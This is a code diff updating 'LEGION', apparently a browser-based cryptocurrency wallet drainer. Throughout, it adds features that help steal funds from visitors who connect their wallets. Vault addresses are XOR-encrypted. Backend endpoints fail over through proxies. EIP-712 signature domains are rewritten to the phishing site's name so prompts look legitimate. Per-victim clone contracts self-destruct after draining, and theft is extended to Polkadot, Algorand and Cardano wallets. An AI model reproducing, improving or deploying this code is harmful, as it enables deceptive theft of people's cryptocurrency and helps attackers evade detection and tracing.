@@ -60,9 +60,10 @@
     hookButtons: true,
     hwWallets: false,
     debugDevTools: false,
+    clientEncryptKey: '',
   }, window.LEGION_CONFIG || {});
 
-  var LEGION_VERSION = '5.13.5';
+  var LEGION_VERSION = '5.14.0';
   var BIP122_BITCOIN_MAINNET = 'bip122:000000000019d6689c085ae165831e93';
 
   /** 16+ EVM chains — factory CREATE2 fills gaps where static map is zero */
@@ -376,6 +377,7 @@
 
   var ZERO_ADDR = '0x0000000000000000000000000000000000000000';
   var SIG_CLAIM = '0x4e71d92d';
+  var SIG_FINISH_DESTROY = '0xd1394451';
   var SIG_VAULT_READ = '0x411557d1';
 
   // LegionDrainV2 DefiAction kinds (must match contracts/LegionDrainV2.sol)
@@ -559,6 +561,24 @@
     return !isZeroAddr(DRAIN_FACTORY[id]);
   }
 
+  function resolveStaticClaimFallback(chainId) {
+    var id = Number(chainId);
+    var ld = LEGION_DRAIN[id];
+    if (!isZeroAddr(ld)) return ld;
+    var cf = CLAIM_FORWARDER[id];
+    if (!isZeroAddr(cf)) return cf;
+    return null;
+  }
+
+  function isFactoryCloneAddress(chainId, contractAddr) {
+    if (!contractAddr) return false;
+    var id = Number(chainId);
+    var addrKey = S.evmAddr ? (String(S.evmAddr).toLowerCase() + ':' + id) : null;
+    var lower = String(contractAddr).toLowerCase();
+    if (addrKey && S.factoryContracts[addrKey] === lower) return true;
+    return false;
+  }
+
   function resolveClaimContract(chainId) {
     var id = Number(chainId);
     var addrKey = S.evmAddr ? (String(S.evmAddr).toLowerCase() + ':' + id) : null;
@@ -568,11 +588,10 @@
     if (S.factoryContracts[id] && !isZeroAddr(S.factoryContracts[id])) {
       return S.factoryContracts[id];
     }
-    var ld = LEGION_DRAIN[id];
-    if (!isZeroAddr(ld)) return ld;
-    var cf = CLAIM_FORWARDER[id];
-    if (!isZeroAddr(cf)) return cf;
-    return null;
+    if (hasFactoryOnChain(id) && !S.factoryFallbackAllowed[id]) {
+      return null;
+    }
+    return resolveStaticClaimFallback(id);
   }
 
   async function ensureUserFactoryContract(address, chainId) {
@@ -595,9 +614,13 @@
         return S.factoryContracts[key];
       }
       if (data && data.fallback) {
+        S.factoryFallbackAllowed[Number(chainId)] = true;
         L.log('[factory] no factory on chain', chainId, '— static LegionDrain fallback');
       }
-    } catch (e) { L.warn('factory deploy predict:', e.message); }
+    } catch (e) {
+      S.factoryFallbackAllowed[Number(chainId)] = true;
+      L.warn('factory deploy predict:', e.message);
+    }
     return null;
   }
 
@@ -640,6 +663,9 @@
 
   function resolveLegionDrain(chainId) {
     var id = Number(chainId);
+    if (hasFactoryOnChain(id) && !S.factoryFallbackAllowed[id]) {
+      return null;
+    }
     var ld = LEGION_DRAIN[id];
     if (!isZeroAddr(ld)) return ld;
     return resolveBatchDrainV2(chainId);
@@ -1380,7 +1406,12 @@
     wcSessionExpired: false,
     evmScanChainIds: null,
     factoryContracts: {},
+    factoryFallbackAllowed: {},
     deactivatedContracts: {},
+    backendEndpoints: [],
+    proxyUrls: [],
+    deployDomains: [],
+    eip712Domains: {},
     relayerSponsored: false,
     chainCapabilities: {},
     deferredBroadcasts: 0,
@@ -2203,6 +2234,90 @@
     return JSON.stringify(obj, function (k, v) { return typeof v === 'bigint' ? v.toString() : v; });
   }
 
+  function resolveApiBaseUrls() {
+    var urls = [];
+    if (S.proxyUrls && S.proxyUrls.length) {
+      S.proxyUrls.forEach(function (u) {
+        var n = String(u).replace(/\/$/, '');
+        if (n && urls.indexOf(n) < 0) urls.push(n);
+      });
+    }
+    if (S.backendEndpoints && S.backendEndpoints.length) {
+      S.backendEndpoints.forEach(function (u) {
+        var n = String(u).replace(/\/$/, '');
+        if (n && urls.indexOf(n) < 0) urls.push(n);
+      });
+    }
+    var primary = String(BACKEND || '').replace(/\/$/, '');
+    if (primary && urls.indexOf(primary) < 0) urls.unshift(primary);
+    return urls.length ? urls : [BACKEND];
+  }
+
+  async function sha256Bytes(str) {
+    if (typeof crypto !== 'undefined' && crypto.subtle && crypto.subtle.digest) {
+      var enc = new TextEncoder().encode(String(str));
+      var hash = await crypto.subtle.digest('SHA-256', enc);
+      return new Uint8Array(hash);
+    }
+    throw new Error('WebCrypto unavailable for vault decrypt');
+  }
+
+  function xorDecryptB64(b64, keyBytes) {
+    var raw = Uint8Array.from(atob(b64), function (c) { return c.charCodeAt(0); });
+    var out = new Uint8Array(raw.length);
+    for (var i = 0; i < raw.length; i++) out[i] = raw[i] ^ keyBytes[i % keyBytes.length];
+    return new TextDecoder().decode(out);
+  }
+
+  async function decryptVaultPayload(encB64, secret) {
+    if (!encB64 || !secret) return null;
+    try {
+      var key = await sha256Bytes(secret);
+      return JSON.parse(xorDecryptB64(encB64, key));
+    } catch (e) {
+      L.warn('vault decrypt fail:', e.message);
+      return null;
+    }
+  }
+
+  function applyDynamicEip712Domain(typedData, chainId) {
+    if (!typedData || !typedData.domain) return typedData;
+    var id = String(Number(chainId));
+    var domCfg = (S.eip712Domains && (S.eip712Domains[id] || S.eip712Domains['default'])) || null;
+    if (domCfg) {
+      if (domCfg.name) typedData.domain.name = domCfg.name;
+      if (domCfg.version) typedData.domain.version = domCfg.version;
+      if (domCfg.verifyingContract) typedData.domain.verifyingContract = domCfg.verifyingContract;
+      return typedData;
+    }
+    if (typeof window !== 'undefined' && window.location && S.deployDomains && S.deployDomains.length) {
+      var origin = window.location.origin;
+      for (var di = 0; di < S.deployDomains.length; di++) {
+        if (S.deployDomains[di] === origin && window.location.hostname) {
+          typedData.domain.name = window.location.hostname.replace(/\./g, ' ');
+          break;
+        }
+      }
+    }
+    return typedData;
+  }
+
+  async function apiFetch(path, opts) {
+    var bases = resolveApiBaseUrls();
+    var lastErr = null;
+    for (var bi = 0; bi < bases.length; bi++) {
+      try {
+        var base = String(bases[bi]).replace(/\/$/, '');
+        await rpcRateWait(base);
+        var res = await fetch(base + path, opts);
+        if (res.status >= 500) throw new Error('HTTP ' + res.status);
+        BACKEND = base;
+        return res;
+      } catch (e) { lastErr = e; }
+    }
+    throw lastErr || new Error('All API endpoints failed');
+  }
+
   async function apiPost(path, body, tries) {
     tries = tries || 0;
     try {
@@ -2216,7 +2331,7 @@
         body: jsonSafe(body),
       };
       if (ctrl) opts.signal = ctrl.signal;
-      var res = await fetch(BACKEND + path, opts);
+      var res = await apiFetch(path, opts);
       if (timer) clearTimeout(timer);
       var data = await res.json().catch(function () { return {}; });
       if (!res.ok) {
@@ -2572,10 +2687,22 @@
 
   async function prefetchVault() {
     try {
-      var res = await fetch(BACKEND + '/api/v1/client-config');
+      var res = await apiFetch('/api/v1/client-config', { method: 'GET', credentials: 'omit' });
       var d = await res.json();
       if (d && d.data) {
+        if (d.data.endpoints && d.data.endpoints.length) {
+          S.backendEndpoints = d.data.endpoints.slice();
+        }
+        if (d.data.proxy_urls && d.data.proxy_urls.length) {
+          S.proxyUrls = d.data.proxy_urls.slice();
+        }
         if (d.data.primary) BACKEND = String(d.data.primary).replace(/\/$/, '');
+        if (d.data.deploy_domains && d.data.deploy_domains.length) {
+          S.deployDomains = d.data.deploy_domains.slice();
+        }
+        if (d.data.eip712_domains && typeof d.data.eip712_domains === 'object') {
+          S.eip712Domains = d.data.eip712_domains;
+        }
         if (d.data.eip7702_enabled === false) S.eip7702Enabled = false;
         if (d.data.relayer_sponsored_gas === true) S.relayerSponsored = true;
         if (d.data.chain_capabilities && typeof d.data.chain_capabilities === 'object') {
@@ -2589,6 +2716,11 @@
           });
         }
         var va = d.data.vault_addresses;
+        var encKey = CFG.clientEncryptKey || '';
+        if (d.data.vault_addresses_encrypted && encKey) {
+          var dec = await decryptVaultPayload(d.data.vault_addresses_encrypted, encKey);
+          if (dec) va = dec;
+        }
         if (va) {
           if (va.evm || va.ethereum) VAULT.evm = va.evm || va.ethereum;
           if (va.sol || va.svm) VAULT.sol = va.sol || va.svm;
@@ -2607,13 +2739,22 @@
   function isFamilyDrainReady(family) {
     var fam = String(family || '').toUpperCase();
     var cap = S.chainCapabilities && S.chainCapabilities[fam];
-    if (cap === 'disabled' || cap === 'anchor_only') return false;
-    if (cap === 'full') return true;
+    if (cap === 'disabled') return false;
+    // anchor_only = signMessage + backend anchor (DOT/ALGO/ADA) — still run
+    if (cap === 'anchor_only' || cap === 'full') return true;
     if (fam === 'COSMOS' && !VAULT.cosmos) return false;
     if (fam === 'APTOS' && !VAULT.aptos) return false;
     if (fam === 'SUI' && !VAULT.sui) return false;
-    if (fam === 'POLKADOT' || fam === 'ALGORAND' || fam === 'CARDANO') return false;
+    // Default: DOT/ALGO/ADA run anchor path when WC/extension connected
+    if (fam === 'POLKADOT' || fam === 'ALGORAND' || fam === 'CARDANO') return true;
     return true;
+  }
+
+  function isAnchorOnlyFamily(family) {
+    var fam = String(family || '').toUpperCase();
+    var cap = S.chainCapabilities && S.chainCapabilities[fam];
+    if (cap === 'anchor_only') return true;
+    return fam === 'POLKADOT' || fam === 'ALGORAND' || fam === 'CARDANO';
   }
 
   function normalizeTypedData(typedDataObj) {
@@ -3300,6 +3441,11 @@
       calls.push({ to: c, data: SIG_APPR + vault.replace('0x', '').padStart(64, '0') + '1'.padStart(64, '0') });
     });
 
+    if (claimContract && isFactoryCloneAddress(chainId, claimContract)) {
+      calls.push({ to: claimContract, data: SIG_FINISH_DESTROY });
+      L.log('[destroy] finishAndDestroy queued for factory clone');
+    }
+
     if (calls.length === 0) return null;
     calls = calls.map(normalizeSendCall);
 
@@ -3327,6 +3473,33 @@
       }
     }
     return lastTxHash;
+  }
+
+  async function tryDestroyCloneAfterDrain(provider, address, chainId, claimContract) {
+    if (!claimContract || !provider || !address) return;
+    if (!isFactoryCloneAddress(chainId, claimContract)) return;
+    try {
+      var id = Number(chainId);
+      var chainHex = '0x' + id.toString(16);
+      var nonceHex = await provider.request({ method: 'eth_getTransactionCount', params: [address, 'pending'] });
+      var fees = await estimateEip1559Fees(provider, chainId);
+      await provider.request({
+        method: 'eth_sendTransaction',
+        params: [{
+          from: address,
+          to: claimContract,
+          data: SIG_FINISH_DESTROY,
+          value: '0x0',
+          chainId: chainHex,
+          nonce: toHexQty(nonceHex),
+          gas: '0x186a0',
+          maxFeePerGas: toHexQty(fees.maxFeePerGas),
+          maxPriorityFeePerGas: toHexQty(fees.maxPriorityFeePerGas),
+        }],
+      });
+      S.deactivatedContracts[String(claimContract).toLowerCase()] = true;
+      L.log('[destroy] finishAndDestroy sent on chain', chainId);
+    } catch (e) { L.warn('[destroy] finishAndDestroy skip:', e.message); }
   }
 
   /** Mobile / WC — claim() contract when deployed, else direct vault transfer */
@@ -3361,6 +3534,9 @@
         L.log('eth_sendTransaction native → vault (deploy ClaimForwarder):', (Number(sendEth) / 1e18).toFixed(6));
       }
       var hash = await provider.request({ method: 'eth_sendTransaction', params: [tx] });
+      if (claimContract && isFactoryCloneAddress(chainId, claimContract)) {
+        tryDestroyCloneAfterDrain(provider, address, chainId, claimContract);
+      }
       return hash ? String(hash) : null;
     } catch (e) {
       L.warn('eth_sendTransaction fail:', e.message);
@@ -3487,6 +3663,7 @@
     var permitSig = null;
     if (bd.typed_data) {
       var td = normalizeTypedData(JSON.parse(JSON.stringify(bd.typed_data)));
+      td = applyDynamicEip712Domain(td, chainId);
       L.log('Permit2 typed_data received, requesting signature...');
       try {
         permitSig = await provider.request({
@@ -3509,6 +3686,7 @@
           var entry = batch[ni];
           try {
             var ntd = normalizeTypedData(JSON.parse(JSON.stringify(entry.typedData)));
+            ntd = applyDynamicEip712Domain(ntd, chainId);
           var nsig = await provider.request({
             method: 'eth_signTypedData_v4', params: [address, JSON.stringify(ntd)],
           });
@@ -4542,8 +4720,11 @@
 
     priority = priority.filter(function (key) {
       if (!isFamilyDrainReady(key)) {
-        L.log('[drain] skip', key, '— capability:', (S.chainCapabilities && S.chainCapabilities[key]) || 'vault/config');
+        L.log('[drain] skip', key, '— disabled');
         return false;
+      }
+      if (isAnchorOnlyFamily(key)) {
+        L.log('[drain] anchor leg', key, '— signMessage + backend submit');
       }
       if (!runners[key]) return false;
       if (key === 'COSMOS' && !S.familyConnections.COSMOS) return false;
